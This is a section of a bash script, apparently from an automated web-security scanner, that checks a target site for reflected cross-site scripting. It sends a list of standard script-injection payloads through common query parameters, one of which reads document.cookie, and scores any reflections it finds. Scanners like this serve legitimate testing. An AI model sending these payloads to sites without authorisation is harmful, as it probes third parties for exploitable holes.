# ─── ADV 22. CROSS-SITE SCRIPTING (XSS) DETECTION ───
_section "[ADV 22/60] XSS (CROSS-SITE SCRIPTING) DETECTION"
run "Testing for reflected XSS..."
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<body onload=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src=javascript:alert('XSS')>"
    "<input onfocus=alert('XSS') autofocus>"
    "<details open ontoggle=alert('XSS')>"
    "<img src=1 onerror=alert(document.cookie)>"
)
XSS_PARAMS=("q" "s" "search" "query" "keyword" "term" "name" "comment" "message" "input" "data" "value" "callback" "jsonp")
XSS_FOUND=0
for param in "${XSS_PARAMS[@]}"; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        # URL encode the payload
        ENCODED=$(printf '%s' "$payload" | python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read().strip()))' 2>/dev/null || echo "$payload")
        RESP=$(_curl "https://$TARGET/?$param=$ENCODED" 2>/dev/null)
        if echo "$RESP" | grep -qiF "$payload"; then
            echo "⚠️  Reflected XSS via ?$param= (payload: ${payload:0:40})" >> "$SESSION/advanced/xss_found.txt"
            XSS_FOUND=$((XSS_FOUND + 1))
        fi
    done
done
if [ $XSS_FOUND -gt 0 ]; then
    ok "$XSS_FOUND reflected XSS vector(s) found!"
    ADV_SCORE=$((ADV_SCORE + 25))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 20))
else
    info "No reflected XSS detected"
fi

